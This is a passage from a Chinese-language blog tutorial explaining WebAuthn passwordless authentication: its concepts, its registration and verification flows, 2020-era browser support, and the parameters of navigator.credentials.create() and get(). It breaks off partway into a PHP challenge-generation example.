开发工具信息</li>\n<li>2020.9.17 更新 iOS/iPad OS 兼容性信息</li>\n<li>2020.5.20 添加部分无用户名认证的平台兼容性内容</li>\n<li>2020.5.15 添加部分 <code>extensions</code> 相关内容与链接；添加全局凭证 ID 唯一内容；添加凭证 ID 查找相关内容；添加“从 U2F 认证迁移”一节</li>\n<li>2020.4.13 更新与修正 <code>userVerification</code> 相关内容；添加部分 Firefox 相关内容</li>\n<li>2020.3.23 文章发布</li>\n</ul>\n<p>那么让我们开始吧。<span></span></p>\n<h1>浅谈 WebAuthn</h1>\n<p>在这个部分里，我们将会从基础概念开始，了解有关 WebAuthn 和密码学的一些基础知识，并最终使用第三方库实现基础的 WebAuthn 认证。如果你已经对这些内容有所了解了，可以跳到“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”继续阅读。</p>\n<h2>为什么使用 WebAuthn</h2>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png\" alt=\"钓鱼邮件\" width=\"709\" height=\"693\" class=\"aligncenter size-full wp-image-2162\"></a>\n<p>相信你一定收到过类似的邮件吧？只要你点进那个最显眼的链接，你就会进入一个设置好的圈套——钓鱼网站。如果你一时糊涂在这类网站上填写了你的账号和密码，bingo，你的账号就不再是你的账号了。</p>\n<p>不过，就算你警惕心再强，也无法避免密码泄露事件。Twitter, Facebook 等都爆出过明文密码泄露事件，证明再大的公司或组织也无法避免密码泄露问题。雪上加霜的是，很大一部分用户都非常喜欢使用重复密码，这就导致一次密码泄露会牵连很多网站，用户的账户安全性完全无法得到保证。</p>\n<p>那么，有什么办法解决这些问题吗？<strong>彻底解决的方法只有一个，那就是抛弃密码。</strong>可是没有密码还怎么验证用户身份呢？这就是 WebAuthn 的用武之地了。</p>\n<p><del>没有密码的好时代，来临力！</del></p>\n<h2>什么是 WebAuthn</h2>\n<p>那么到底什么是 WebAuthn 呢？如开头所说，WebAuthn 是“一个用于访问公钥凭证的 API”，网站可以通过这个 API 进行一些高安全性的身份验证。WebAuthn 一个最常见的应用就是用于网站登录时的 2FA（双重因素验证）甚至是无密码登录。通过网页调用 WebAuthn，在不同平台下，<strong>我们可以实现通过 USB Key、指纹、面部甚至虹膜扫描来认证身份，同时确保安全和隐私。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png\" alt=\"WebAuthn 可使用的各种身份认证方式\" width=\"1294\" height=\"566\" class=\"aligncenter size-full wp-image-2213\"></a>\n<p>WebAuthn 标准是 FIDO2 标准的一部分，而 FIDO2 则是由 FIDO 联盟和 W3C 共同推出的 U2F（现称作 FIDO1）的后继标准，旨在增强网络认证的安全性。</p>\n<blockquote><p>你可能了解过 U2F，那么 U2F 和 FIDO2 的区别在哪里呢？从名字上可以看出，U2F，即“通用第二因素协议”，是专注于作为密码后的第二道屏障的，而 FIDO2 增加了单因素认证功能，这意味着使用 FIDO2 可以完全替代密码，真正实现无密码登录。</p></blockquote>\n<p>FIDO2 标准主要包括四个部分，其一是用于网站和访客设备交互的 WebAuthn，而 Client to Authenticator Protocol 2（CTAP2，客户端-认证器协议）作为 WebAuthn 的补充，则是用于访客的设备和认证器交互的协议。标准的其他两个部分则是 U2F 和 UAF 规范。在这篇文章中，我们只关心 WebAuthn，不会涉及 CTAP, U2F 和 UAF 的相关知识。如果你对这段话中的一些概念不了解，不要紧张，接下来我们就来谈谈 WebAuthn 中一些常用的术语和概念。</p>\n<blockquote><p>WebAuthn 只能在安全上下文中使用，也就是说，页面需要使用 HTTPS 协议或是处于 <code>localhost</code> 中。</p></blockquote>\n<h2>常用术语和概念</h2>\n<p>WebAuthn 中有许多不常碰到的术语，不过我只会在这里介绍一些常用的术语和概念——如果你只是希望做出一个简单的实现，那么了解这一段中的一些概念就足够了。同时，由于我实在没能找到一部分术语的通用翻译，有一些术语我按着自己的理解尽可能地翻译了，有任何问题请告诉我。</p>\n<p>在一个完整的 WebAuthn 认证流程中，通常有这么几个角色：</p>\n<ul>\n<li>Relying Party 依赖方 (RP) ：指服务提供方，即网站</li>\n<li>User 用户：正准备登录的你</li>\n<li>Authenticator 认证器：通常指 USB Key 或是设备内置的指纹扫描器、虹膜扫描器、面部识别装置等，正是它们在使用流程中代替了密码甚至是用户名</li>\n<li>User Agent 用户代理：通常指浏览器或系统，负责与认证器交互</li>\n</ul>\n<p>认证过程通常分为两种：</p>\n<ul>\n<li>Registration Ceremony 注册仪式：用户向账户上添加认证器</li>\n<li>Authentication Ceremony 验证仪式：用户通过已注册的认证器验证身份</li>\n</ul>\n<p>同时，认证过程中还会产生这些内容：</p>\n<ul>\n<li>Challenge 挑战：通常是一串随机字符串</li>\n<li>Public Key Credential 公钥凭证：由认证器产生的凭证，在技术上代替了密码</li>\n<li>Attestation 证明：注册时认证器产生的验证数据</li>\n<li>Assertion 断言：验证时认证器产生的验证数据</li>\n</ul>\n<blockquote><p><strong>请注意区分证明 (Attestation) 和断言 (Assertion)</strong>，特别是在这两个单词有些相似的情况下。在 WebAuthn 中，它们是不同过程中的类似概念，但并不相同。</p></blockquote>\n<p>如果你对于这些内容不是很理解，没有关系，我们会在“<a href=\"https://flyhigher.top/#how-to-webauthn\">使用流程</a>”一节中将这些概念放到实际情况中解释，你只要先区分这些概念即可。</p>\n<h2>安全性的基础</h2>\n<p>WebAuthn 为什么安全？和 HTTPS 一样，WebAuthn 使用非对称加密的思路来保证安全性，但侧重点又有所不同。要理解 WebAuthn 的认证流程，我们必须对非对称加密有所了解。如果你对非对称加密比较熟悉了，就直接跳到下一段吧。</p>\n<p>WebAuthn 的核心在于“认证”，即保证产生了凭证的认证器是用户的认证器，而不是第三方在伪造凭证。但为什么要使用非对称加密呢？我们可以先来看看对称加密。</p>\n<p>让我们假设小明和小红相互写信，见不到对方。这天小红突然想，给自己写信的人是不是真的小明呢？于是小红要求对方向小红证明自己是小明。怎么证明呢？他们商量出来这么一套方案：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明和小红商量一个统一的密码和密钥</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明用提前和小红商量好的密码和密钥加密文本后发回给小红</li>\n<li>小红使用相同的密码和密钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和密钥</li>\n</ol>\n<blockquote><p>在密码学中，我们通常把“加密算法”称为密码 (code)，和通常登录时用的密码 (password) 并非同一个概念。</p></blockquote>\n<p>在这种情况下，<strong>只要密钥不泄露</strong>，即拥有正确密钥的只有小明和小红，那么小红就能确定对方一定是小明。但这样的问题也很明显，如果小明和小红不能见面，那么他们就必须先以明文交换密码——<strong>在这个过程中一旦有人窃取到了密码，这个认证就无效了。</strong></p>\n<p>这时我们就需要使用<strong>非对称加密</strong>来拯救破碎的信任了。非对称加密的基础是一对密钥，也就是公钥和私钥，它们是互相关联但（几乎）无法互相推导的。在非对称加密的过程中，选择相同的密码后，使用私钥加密明文得到的密文只能由对应的公钥解密，无法使用私钥解密，同时这个过程反过来也是成立的。</p>\n<blockquote><p>本文的核心并不是非对称加密算法，因此不会详述非对称加密在数学上的证明，若有兴趣可以自行了解。</p></blockquote>\n<p>这就完美解决密钥泄露的问题了。让我们回过头来看之前的例子。现在小明和小红决定使用非对称加密来证明身份，过程如下：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明提前生成一对公私钥，将公钥发送给小红，私钥自己保管，同时商量好统一的密码</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明使用商量好的密码和自己的私钥加密文本，发送给小红</li>\n<li>小红使用相同的密码和小明的公钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和私钥</li>\n</ol>\n<p>在这种情况下，<strong>只要私钥不泄露</strong>，那么小红解密得到的文本和之前发送的一致，那么就可以证明收到的密文一定是由小明加密后发送过来的。而在整个过程中，私钥都没有离开过小明，更没有经过传输，也就几乎没有泄露的可能了。这时，小红终于可以确定对面和她通信的人的确是小明了。</p>\n<p>题外话：HTTPS 虽然也应用了非对称加密，但 HTTPS 更侧重于“加密”而非“认证”，因此思路上会有些许差异。要了解关于 HTTPS 和非对称加密的更多信息，你可以阅读我之前写的这篇文章：</p>\n<p></p>\n<div class=\"mdx-post-cot\" data-mdxposturl=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdx-post-wait-out-c2\"><div class=\"mdx-post-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<span></span>\n<h2>使用流程</h2>\n<p>了解了非对称加密，我们就可以来看看 WebAuthn 的认证流程了。</p>\n<p>和普通的密码一样，<strong>使用 WebAuthn 分为两个部分，注册和验证。</strong>注册仪式会在依赖方中将认证器的一些信息和用户建立关联；而验证仪式则是验证这些信息以登确保是用户本人在登录。根据上一节的思路，我们可以知道，注册仪式就是认证器生成一对公私钥，然后将公钥交给依赖方；而验证仪式是依赖方发送给认证器一段文本，要求认证器用自己的私钥加密后发回以验证。</p>\n<p>在实际情况中，WebAuthn 是基于<strong>挑战-应答模型</strong>工作的。要更好地理解，我们直接来看具体流程。先来看看注册的流程。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png\" alt=\"WebAuthn 注册流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2224\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的注册请求</li>\n<li>依赖方向浏览器发送挑战、依赖方信息和用户信息</li>\n<li>浏览器向认证器发送挑战、依赖方信息、用户信息和客户端信息以请求创建公钥凭证</li>\n<li>认证器请求用户动作，随后创建一对公私钥，并使用私钥签名挑战（即证明），和公钥一起交给浏览器</li>\n<li>浏览器将签名后的挑战和公钥发送给依赖方</li>\n<li>依赖方用公钥验证挑战是否与发送的一致，如果成功则将公钥与用户绑定，注册完成</li>\n</ol>\n<p>我也做了一个交互式的 Demo，你可以对照流程来更好地理解。</p>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\">开始注册</button> <span></span></p>\n<div></div>\n<blockquote><p>注意，这个 Demo 和下方的 Demo 都只是一个本地模拟的简单示例，没有任何数据会被上传，当然也不会对数据进行验证。</p></blockquote>\n<p>而之后的验证流程如下：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png\" alt=\"WebAuthn 验证流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2226\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的验证请求</li>\n<li>依赖方向浏览器发送挑战</li>\n<li>浏览器向认证器发送挑战、依赖方信息和客户端信息以请求获取公钥凭证</li>\n<li>认证器请求用户动作，随后通过依赖方信息找到对应私钥，并使用私钥签名挑战（即断言），交给浏览器</li>\n<li>浏览器将签名后的挑战发送给依赖方</li>\n<li>依赖方用之前存储的公钥验证挑战是否与发送的一致，一致则验证成功</li>\n</ol>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\" disabled>开始验证</button> <span>在上方注册后才能验证</span></p>\n<div></div>\n<p>可以看到，WebAuthn 不仅在理论上是安全的，同时<strong>在整个过程中并没有隐私数据被传输</strong>——用户信息实际上只包含用户名和用户 ID。因此我们完全可以说 WebAuthn 是安全且私密的。</p>\n<blockquote><p>为了避免用户在不同依赖方之间被追踪，认证器通常会为每个依赖方和用户的组合都创建一对公私钥。不过，由于认证器的存储空间有限，认证器通常不会存储每一个私钥，而是会通过各类信息和烧录在认证器内的主密钥“算”出对应的私钥以实现无限对公私钥。具体算法根据不同厂商会有所不同。对于 Yubikey，你可以在<a href=\"https://developers.yubico.com/U2F/Protocol_details/Key_generation.html\">这里</a>了解更多。</p></blockquote>\n<blockquote><p>如果依赖方需要，用户同意后，发送给依赖方的公钥凭证中可以包含用于辨认认证器型号的信息，不过这对隐私的影响微乎其微。</p></blockquote>\n<h2>浏览器接口</h2>\n<p>要使用 WebAuthn，我们必须要依靠浏览器作为媒介和验证器进行交互，而这就需要浏览器对于 WebAuthn 的支持了。绝大多数新版本的现代浏览器都为 WebAuthn 提供了统一的接口，而在这一段中我们会了解如何使用相关的接口。但是在开始之前，我们可以先来看看浏览器的支持程度（2020.9）。</p>\n<div class=\"mdui-table-fluid\"><table class=\"mdui-table\">\n<thead><tr>\n<th>浏览器</th>\n<th>支持情况</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>桌面端 Chrome</td>\n<td>67+</td>\n</tr>\n<tr>\n<td>移动端 Chrome</td>\n<td>67+<sup>[1]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Firefox</td>\n<td>60+</td>\n</tr>\n<tr>\n<td>移动端 Firefox</td>\n<td>不支持<sup>[2]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Edge</td>\n<td>18+</td>\n</tr>\n<tr>\n<td>移动端 Edge</td>\n<td>不支持<sup>[3]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Safari</td>\n<td>13+</td>\n</tr>\n<tr>\n<td>移动端 Safari</td>\n<td>13.3+<sup>[4]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Opera</td>\n<td>54+</td>\n</tr>\n<tr>\n<td>移动端 Opera</td>\n<td>不支持</td>\n</tr>\n</tbody>\n</table></div>\n<p><sup>[1]</sup> 受平台限制，Chrome 在 iOS 平台上不支持 WebAuthn，在 Android 平台上支持大部分 WebAuthn 功能，但仍不支持部分特性（如 <code>userVerification</code>）。<br><sup>[2]</sup> 移动端 Firefox 80 以下的版本支持 WebAuthn 但似乎会忽略 <code>authenticatorAttachment</code> 等一部分参数，同时移动端 Firefox Beta 80 以下的版本支持 WebAuthn 但无法成功调用。自 80 版本起移动端 Firefox 暂时取消了对 WebAuthn 的支持（可能是 Bug）。<br><sup>[3]</sup> 移动端 Edge 似乎支持 WebAuthn 但无法成功调用。<br><sup>[4]</sup> Safari iOS/iPad OS 13 仅支持外部认证器，无法调用 Touch ID 或 Face ID；自 iOS/iPad OS 14 起 Safari 已支持全功能 WebAuthn，可以调用 Touch ID/Face ID</p>\n<p>当然，一众国产浏览器，包括 Samsung Browser 和 Yandex Browser，目前都不支持 WebAuthn。此外，由于 WebAuthn 涉及外部验证器和 TPM 可信平台模块等，用户的操作系统也会对 WebAuthn 的可用性造成影响。以下是一些需要注意的信息：</p>\n<ul>\n<li>Windows 10 1903 以下版本仅 Edge 能提供完整支持，其他浏览器只能使用 USB Key 等外部认证器；1903+ 中所有浏览器都可以通过 Windows Hello 带来完整的 WebAuthn 支持</li>\n<li>Android 需要安装并开启 Google 服务</li>\n<li>iOS/iPad OS 13.3 以下的版本不支持 WebAuthn，iOS/iPad OS 14 以下的版本支持有限（参考上文），iOS/iPad OS 14 开始 Safari 已支持全功能 WebAuthn（功能完整度甚至超过了 Android）</li>\n</ul>\n<p>可以看出，WebAuthn 的发展之路仍然很漫长，但好在桌面端对它的支持已经比较完善了，在一些情况下我们完全有理由使用它。</p>\n<hr>\n<p>来看看浏览器提供了怎么样的接口吧。要使用 WebAuthn，我们可以使用 <code>navigator.credentials.create()</code> 请求认证器生成公钥凭证和 <code>navigator.credentials.get()</code> 请求获取公钥凭证。</p>\n<blockquote><p>你或许已经对 Credential Management API 有所了解了。通过这些 API，我们还可以实现一些有趣的特性，不过这值得另开一篇文章来讲了。</p></blockquote>\n<p>对于一个基础的实现，<code>navigator.credentials.create()</code> 需要传入的参数如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        challenge,\r\n        rp: {\r\n            id,\r\n            name\r\n        },\r\n        user: {\r\n            id,\r\n            name,\r\n            displayName\r\n        },\r\n        pubKeyCredParams: [\r\n            {\r\n                type: \"public-key\",\r\n                alg\r\n            }\r\n        ],\r\n        authenticatorSelection: {\r\n            authenticatorAttachment,\r\n            userVerification\r\n        },\r\n        excludeCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>在 <code>navigator.credentials.create()</code> 方法中，我们必须传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值。这指明了我们需要创建公钥凭证，而非普通的密码凭证。然后，在 <code>publicKey</code> 对象中设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rp: Object</code>：依赖方信息，其中有一项为必须：\n<ul>\n<li>\n<code>rp.id: String</code>：（可选）依赖方 ID，必须为当前域名或为当前域名的子集的域名（不是子域名）。如域名为 <code>test.123.example.com</code>，则依赖方 ID 可以是 <code>test.123.example.com</code>, <code>123.example.com</code> 或 <code>example.com</code>。不指定则默认使用当前域名</li>\n<li>\n<code>rp.name: String</code>：依赖方名称，用于方便用户辨认</li>\n</ul>\n</li>\n<li>\n<code>user: Object</code>：用户信息，其中有三项为必须：\n<ul>\n<li>\n<code>user.id: Uint8Array</code>：转换为 <code>Uint8Array</code> 的字符串。<strong>出于安全考量，这应尽可能不与任何用户信息相关联，如不要包含用户名、用户邮箱等</strong>\n</li>\n<li>\n<code>user.name: String</code>：登录用户名</li>\n<li>\n<code>user.dispalyName: String</code>：用于显示的用户名称，显示与否的具体行为取决于浏览器</li>\n</ul>\n</li>\n<li>\n<code>pubKeyCredParams: Array</code>：一个算法列表，指明依赖方接受哪些签名算法。列表的每一项都是一个对象，拥有两个属性：\n<ul>\n<li>\n<code>pubKeyCredParams[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>pubKeyCredParams[].alg: Number</code>：一个负整数，用于标明算法。具体算法对应的数字可以在 <a href=\"https://www.iana.org/assignments/cose/cose.xhtml#algorithms\">COSE</a> 找到</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection: Object</code>：（可选）用于过滤正确的认证器，这里介绍常用的一个参数：\n<ul>\n<li>\n<code>authenticatorSelection.authenticatorAttachment: String</code>：（可选）指定要求的认证器类型。如果没有满足要求的认证器，认证可能会失败。该参数可以为 <code>null</code>（表示接受所有类型的认证器）或是以下两个值之一：\n<ul>\n<li>\n<code>platform</code>：表示仅接受平台内置的、无法移除的认证器，如手机的指纹识别设备</li>\n<li>\n<code>cross-platform</code>：表示仅接受外部认证器，如 USB Key</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection.userVerification: String</code>：（可选）指定认证器是否需要验证“用户为本人 (User Verified, UV)”，否则只须“用户在场 (User Present, UP)”。具体验证过程取决于认证器（不同认证器的认证方法不同，也有认证器不支持用户验证），而对验证结果的处理情况则取决于依赖方。该参数可以为以下三个值之一：\n<ul>\n<li>\n<code>required</code>：依赖方要求用户验证</li>\n<li>\n<code>preferred</code>：（默认）依赖方希望有用户验证，但也接受用户在场的结果</li>\n<li>\n<code>discouraged</code>：依赖方不关心用户验证。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>excludeCredentials: Array</code>：（可选）用于标识要排除的凭证，可以避免同一个用户多次注册同一个认证器。如果用户试图注册相同的认证器，用户代理会抛出 <code>InvalidStateError</code> 错误。数组中的每一项都是一个公钥凭证对象，包含以下属性：\n<ul>\n<li>\n<code>excludeCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>excludeCredentials[].id: Uint8Array</code>：要排除的凭证 ID</li>\n<li>\n<code>excludeCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，超时后将强制终止 <code>create()</code> 并抛出错误。若不设置，将使用用户代理的默认值；若太大或太小，则使用最接近的用户代理默认值范围中的值。推荐值为 5000-120000</li>\n</ul>\n<blockquote><p>对于 <code>pubKeyCredParams</code>，通常我们只需添加 ES256 (alg: -7) 算法即可兼容大部分外部认证器，此外，再添加 RS256 (alg: -257) 算法即可兼容大部分平台内置认证器（如 Windows Hello）。当然，前端添加算法之后，后端也需要相应的算法支持。</p></blockquote>\n<blockquote><p>对于 <code>userVerification</code>，由于默认值 “preferred” 并不能很好地被所有设备支持，因此无论在 <code>create()</code> 中还是 <code>get()</code> 中不指定该参数都会在 Chrome 中触发一条警告。具体请参阅<a href=\"https://chromium.googlesource.com/chromium/src/+/master/content/browser/webauth/uv_preferred.md\">这个页面</a>。</p></blockquote>\n<p>调用 <code>create()</code> 之后，我们就可以拿到一个 <code>Promise</code>，并可以在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>create()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAttestationResponse {\r\n        attestationObject: ArrayBuffer(390) {},\r\n        clientDataJSON: ArrayBuffer(121) {}\r\n    },\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\",\r\n    type: \"public-key\"\r\n}</pre>\n<p>其中有：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：<code>AuthenticatorAttestationResponse</code> 对象，是 <code>PublicKeyCredential</code> 的主要部分，包含以下两个内容：\n<ul>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n<li>\n<code>response.attestationObject: ArrayBuffer</code>：CBOR 编码的认证器数据，包含凭证公钥、凭证 ID、签名（如果有）、签名计数等信息</li>\n</ul>\n</li>\n</ul>\n<p>然后将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串，我们就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证与注册了。具体怎么操作，我们会在下文详细讨论。当然，别忘了 <code>catch()</code> 注册过程中抛出的任何错误。</p>\n<blockquote><p>你可能会认为在所有情况下，注册时认证器都会对挑战进行签名。实际上在大部分情况下（同时也是默认情况），<strong>注册时认证器并不会对挑战进行签名</strong>，<code>attestationObject</code> 并不会包含签名后的挑战。只有依赖方明确要求证明且用户同意（部分浏览器要求）后认证器才会对挑战进行签名（具体实现据情况会有所不同）。对此，<a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion#Attestation\">MDN 解释道</a>“大部分情况下，用户注册公钥时我们会使用「初次使用时信任模型」(TOFU) ，此时验证公钥是没有必要的。”要了解更多关于证明的内容，请参阅“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>而对于 <code>navigator.credentials.get()</code>，我们可以传入如下的参数：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.get({\r\n    publicKey: {\r\n        challenge,\r\n        rpId,\r\n        userVerification,\r\n        allowCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>和 <code>create()</code> 一样，对于 <code>get()</code> 我们需要传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值，指明我们需要获取的是公钥凭证而非普通的密码凭证。在 <code>publicKey</code> 对象中我们可以设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rpID: String</code>：（可选）依赖方 ID，需要和注册认证器时的一致。规则和上述的 <code>rp.id</code> 一致，不指定默认使用当前域名</li>\n<li>\n<code>userVerification: String</code>：和上文一样，只是需要注意它这次不在 <code>authenticatorSelection</code> 中了</li>\n<li>\n<code>allowCredentials: Array</code>：（可选）用于标识允许的凭证 ID，使用户代理找到正确的认证器。只有符合这个列表中凭证 ID 的凭证才能被成功返回。数组中的每一项都是对象，包含以下属性：\n<ul>\n<li>\n<code>allowCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>allowCredentials[].id: Uint8Array</code>：允许的凭证 ID</li>\n<li>\n<code>allowCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，和上面的一样，推荐值为 5000-120000</li>\n</ul>\n<p>嗯，要传入的参数少多了。之后，和 <code>create()</code> 一样，调用 <code>get()</code> 之后，我们就可以拿到一个 <code>Promise</code> 并在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>get()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAssertionResponse {\r\n        authenticatorData: ArrayBuffer(37) {},\r\n        signature: ArrayBuffer(256) {},\r\n        userHandle: ArrayBuffer(64) {},\r\n        clientDataJSON: ArrayBuffer(118) {}\r\n    }\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\"\r\n    type: \"public-key\"\r\n}</pre>\n<p>这里的东西就比 <code>create()</code> 时拿到的要多了。看看我们拿到了什么吧：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：对于验证流程，认证会返回 <code>AuthenticatorAssertionResponse</code> 而不是 <code>AuthenticatorAttestationResponse</code> 对象，这个对象包含以下 4 个属性：\n<ul>\n<li>\n<code>response.authenticatorData: ArrayBuffer</code>：认证器信息，包含认证状态、签名计数等</li>\n<li>\n<code>response.signature: ArrayBuffer</code>：被认证器签名的 <code>authenticatorData</code> + <code>clientDataHash</code>（<code>clientDataJSON</code> 的 SHA-256 hash）</li>\n<li>\n<code>response.userHandle: ArrayBuffer</code>：<code>create()</code> 创建凭证时的用户 ID <code>user.id</code>。许多 U2F 设备不支持这一特性，这一项将会是 <code>null</code>\n</li>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n</ul>\n</li>\n</ul>\n<p>同样地，我们将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串后就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证了。至于具体怎么做，别急，马上就来讲一讲。</p>\n<h2>简单实现</h2>\n<p>了这么多，我们终于可以实现一个简单的 WebAuthn 认证页面了。由于在实际操作中 WebAuthn 相关的数据解码和密码计算比较复杂，在服务器端我们可以使用第三方库来帮我们做这些脏活累活，我们只需专注于具体流程就可以了。</p>\n<p>要寻找可用的第三方库，你可以在 <a href=\"https://webauthn.io/\">webauthn.io</a> 上找到适用于各种语言的第三方库——除了 PHP（笑）。不过好在你可以在 GitHub 上找到几个不错的 PHP WebAuthn 库，比如 <a href=\"https://github.com/web-auth/webauthn-framework\">web-auth/webauthn-framework</a>。</p>\n<p>在我们的这个例子中，我们关心的主要是前端逻辑；而后端我们可以使用各类几乎已经做到开箱即用的第三方库，这样我们可以专注于流程而不必关心细节。当然如果你想了解后端的解码细节，可以阅读“<a href=\"https://flyhigher.top/#webauthn-decode\">手动解个码</a>”一节。</p>\n<hr>\n<p>让我们先从注册开始吧。现在，用户点击了注册认证器的按钮，一个请求被发送给服务器（也就是依赖方）。在最简单的情况中，依赖方需要将三个内容发送给浏览器：<strong>挑战、用户信息和用户已注册的凭证 ID 列表（即 <code>excludeCredentials</code>）</strong>。当然依赖方也可以自由选择发送更多信息，只要最终前端能构建合法的参数即可。</p>\n<p>挑战最终会被转换为 <code>Uint8Array</code>，即一组 0-255 的整数。如果使用 PHP，在后端我们可以这样生成 Base64 编码的挑战：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">$challenge = \"\";\r\nfor($i = 0; $i \n<p>对于用户信息，我们需要登录名、显示名称和 ID 三项内容。我们可以从数据库中取出用户信息，也可以新建一份。需要注意的是，<strong>出于安全和隐私的考量，ID 